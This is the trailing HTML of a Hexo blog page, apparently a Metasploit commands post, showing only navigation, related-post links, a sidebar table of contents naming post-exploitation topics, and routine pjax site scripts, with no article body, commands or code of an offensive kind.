+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8C%87%E4%BB%A4/">指令</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/17/Linux-Create-user/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Linux/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Linux - 建立 Sudo 權限 User</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/17/github-tools-wttrin-weather/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/12/17/github-tools-wttrin-weather/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">wttr.in - 查天氣既工具</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相關推薦</span></div><div class="relatedPosts-list"><div><a href="/2021/12/11/Aircrack-NG-commands/" title="Aircrack-NG - 完整的評估 WiFi 網絡安全的工具"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/12/11/Aircrack-NG-commands/cover.svg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-11</div><div class="title">Aircrack-NG - 完整的評估 WiFi 網絡安全的工具</div></div></a></div><div><a href="/2022/01/14/Arch-Linux-install-make/" title="Arch Linux - 安裝 make"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Arch%20Linux/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-14</div><div class="title">Arch Linux - 安裝 make</div></div></a></div><div><a href="/2022/02/15/Arch-Linux-install-nodejs-npm/" title="Arch Linux - 裝 NPM NodeJS"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Arch%20Linux/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-15</div><div class="title">Arch Linux - 裝 NPM NodeJS</div></div></a></div><div><a href="/2022/02/15/Arch-Linux-install-vscode/" title="Arch Linux - 裝 Visual Studio Code"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Arch%20Linux/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-15</div><div class="title">Arch Linux - 裝 Visual Studio Code</div></div></a></div><div><a href="/2021/12/22/Aria2c-commands/" title="Aria2 - 多線程下載工具"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Linux/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-22</div><div class="title">Aria2 - 多線程下載工具</div></div></a></div><div><a href="/2021/12/11/ArpSpoof-commands/" title="ArpSpoof - 一個執行 ARP 欺騙攻擊的工具"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/12/11/ArpSpoof-commands/cover.svg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-11</div><div class="title">ArpSpoof - 一個執行 ARP 欺騙攻擊的工具</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/lala.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Halohalo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">276</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">標籤</div><div class="length-num">87</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分類</div><div class="length-num">66</div></a></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我中學雞黎架炸 xD</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目錄</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%8F%97%E5%AE%B3%E8%80%85-CMD-%E4%B8%BB%E6%8E%A7%E5%8F%B0"><span class="toc-number">1.</span> <span class="toc-text">操作受害者 CMD 主控台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B5%82%E6%AD%A2%E9%98%B2%E6%AF%92%E8%BB%9F%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">終止防毒軟件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9C%E6%AD%A2-Windows-Defender-%E9%9C%80%E8%A6%81%E7%B3%BB%E7%B5%B1%E7%AE%A1%E7%90%86%E5%93%A1%E8%BA%AB%E4%BB%BD"><span class="toc-number">3.</span> <span class="toc-text">停止 Windows Defender (需要系統管理員身份)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%8C%81%E7%BA%8C%E6%80%A7%E5%BE%8C%E9%96%80-%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.</span> <span class="toc-text">生成持續性後門 (方法一)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E9%81%94%E6%88%90%E7%9B%AE%E6%A8%99"><span class="toc-number">4.1.</span> <span class="toc-text">快速達成目標</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A9%E5%8F%A5%E6%97%A2%E6%84%8F%E6%80%9D%E4%BF%82"><span class="toc-number">4.1.1.</span> <span class="toc-text">兩句既意思係</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%8C%81%E7%BA%8C%E6%80%A7%E5%BE%8C%E9%96%80-%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%8C%E5%8A%A0%E5%85%A5%E6%9C%8D%E5%8B%99-%E9%9C%80%E8%A6%81%E7%B3%BB%E7%B5%B1%E5%AE%98%E7%90%86%E5%93%A1"><span class="toc-number">5.</span> <span class="toc-text">生成持續性後門 (方法二，加入服務 [需要系統官理員])</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%9D-metsvc-%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">5.1.</span> <span class="toc-text">安裝 metsvc (方法一)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%9D-metsvc-%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">5.2.</span> <span class="toc-text">安裝 metsvc (方法二)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%99%A4%E5%AE%89%E8%A3%9D-metsvc"><span class="toc-number">5.3.</span> <span class="toc-text">解除安裝 metsvc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E6%8C%87%E4%BB%A4"><span class="toc-number"></span> <span class="toc-text">更多指令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4-%E5%85%A5%E4%BE%B5%E5%BE%8C"><span class="toc-number"></span> <span class="toc-text">常用指令 (入侵後)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F-%E5%85%A5%E4%BE%B5%E5%BE%8C"><span class="toc-number">1.</span> <span class="toc-text">常用指令格式 (入侵後)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%BD%BF%E7%94%A8%E6%BB%B2%E9%80%8F%E6%A8%A1%E7%B5%84-%E5%85%A5%E4%BE%B5%E5%BE%8C"><span class="toc-number"></span> <span class="toc-text">常用使用滲透模組 (入侵後)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5-Module"><span class="toc-number"></span> <span class="toc-text">查 Module</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/14/Metasploit-commands/" title="Metasploit - 基本指令"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Metasploit/cover.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Metasploit - 基本指令"/></a><div class="content"><a class="title" href="/2022/06/14/Metasploit-commands/" title="Metasploit - 基本指令">Metasploit - 基本指令</a><time datetime="2022-06-14T12:12:30.000Z" title="發表於 2022-06-14 20:12:30">2022-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/" title="Yumi - USB 驅動器工具 (Windows)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/yumi.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yumi - USB 驅動器工具 (Windows)"/></a><div class="content"><a class="title" href="/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/" title="Yumi - USB 驅動器工具 (Windows)">Yumi - USB 驅動器工具 (Windows)</a><time datetime="2022-06-14T11:36:26.000Z" title="發表於 2022-06-14 19:36:26">2022-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/13/Windows-Change-DNS-Settings/" title="Windows - 改變 DNS 位置"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Windows/cover.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows - 改變 DNS 位置"/></a><div class="content"><a class="title" href="/2022/06/13/Windows-Change-DNS-Settings/" title="Windows - 改變 DNS 位置">Windows - 改變 DNS 位置</a><time datetime="2022-06-13T06:27:38.000Z" title="發表於 2022-06-13 14:27:38">2022-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/13/Windows-disabled-Discord-startup/" title="Windows 系統 - 移除 Discord 開機啟動程式"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/06/13/Windows-disabled-Discord-startup/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows 系統 - 移除 Discord 開機啟動程式"/></a><div class="content"><a class="title" href="/2022/06/13/Windows-disabled-Discord-startup/" title="Windows 系統 - 移除 Discord 開機啟動程式">Windows 系統 - 移除 Discord 開機啟動程式</a><time datetime="2022-06-12T16:32:32.000Z" title="發表於 2022-06-13 00:32:32">2022-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/12/Windows-disabled-windows-desktop-watermark/" title="Windows 7/8/10/11 系統 - 免啟動系統去除桌面中的 &quot;啟用 Windows 水印&quot;"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Windows/cover.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows 7/8/10/11 系統 - 免啟動系統去除桌面中的 &quot;啟用 Windows 水印&quot;"/></a><div class="content"><a class="title" href="/2022/06/12/Windows-disabled-windows-desktop-watermark/" title="Windows 7/8/10/11 系統 - 免啟動系統去除桌面中的 &quot;啟用 Windows 水印&quot;">Windows 7/8/10/11 系統 - 免啟動系統去除桌面中的 &quot;啟用 Windows 水印&quot;</a><time datetime="2022-06-12T15:58:05.000Z" title="發表於 2022-06-12 23:58:05">2022-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/" title="Windows 10 系統 - 免啟動系統更改主題為黑暗"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Windows/cover.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows 10 系統 - 免啟動系統更改主題為黑暗"/></a><div class="content"><a class="title" href="/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/" title="Windows 10 系統 - 免啟動系統更改主題為黑暗">Windows 10 系統 - 免啟動系統更改主題為黑暗</a><time datetime="2022-06-12T04:12:44.000Z" title="發表於 2022-06-12 12:12:44">2022-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/12/Windows-10-Change-Wallpaper-Without-Activation/" title="Windows 10 系統 - 免啟動系統更改背景圖片"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Windows/cover.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows 10 系統 - 免啟動系統更改背景圖片"/></a><div class="content"><a class="title" href="/2022/06/12/Windows-10-Change-Wallpaper-Without-Activation/" title="Windows 10 系統 - 免啟動系統更改背景圖片">Windows 10 系統 - 免啟動系統更改背景圖片</a><time datetime="2022-06-12T04:02:28.000Z" title="發表於 2022-06-12 12:02:28">2022-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/VirtualBox-enabled-USB-Cam/" title="VirtualBox - 啟動 USB, Cam"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/VirtualBox/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VirtualBox - 啟動 USB, Cam"/></a><div class="content"><a class="title" href="/2022/06/11/VirtualBox-enabled-USB-Cam/" title="VirtualBox - 啟動 USB, Cam">VirtualBox - 啟動 USB, Cam</a><time datetime="2022-06-11T15:43:06.000Z" title="發表於 2022-06-11 23:43:06">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/system-install-after-most-do-things/" title="Cyber Security - 安裝作業系統後必須要做的安全事項"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Hongkong.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cyber Security - 安裝作業系統後必須要做的安全事項"/></a><div class="content"><a class="title" href="/2022/06/11/system-install-after-most-do-things/" title="Cyber Security - 安裝作業系統後必須要做的安全事項">Cyber Security - 安裝作業系統後必須要做的安全事項</a><time datetime="2022-06-11T15:01:04.000Z" title="發表於 2022-06-11 23:01:04">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/hexo-backup-to-new-device/" title="Hexo - 備份至新電腦繼續寫文章"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Post/image/Hexo/cover.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hexo - 備份至新電腦繼續寫文章"/></a><div class="content"><a class="title" href="/2022/06/11/hexo-backup-to-new-device/" title="Hexo - 備份至新電腦繼續寫文章">Hexo - 備份至新電腦繼續寫文章</a><time datetime="2022-06-11T09:02:54.000Z" title="發表於 2022-06-11 17:02:54">2022-06-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/Post/image/Metasploit/top_img.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Halohalo</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="閱讀模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="淺色和深色模式轉換"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="單欄和雙欄切換"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="設定"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目錄"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到頂部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search Somethings ...</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Data loading</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search Post" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.3" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script></div></body></html>
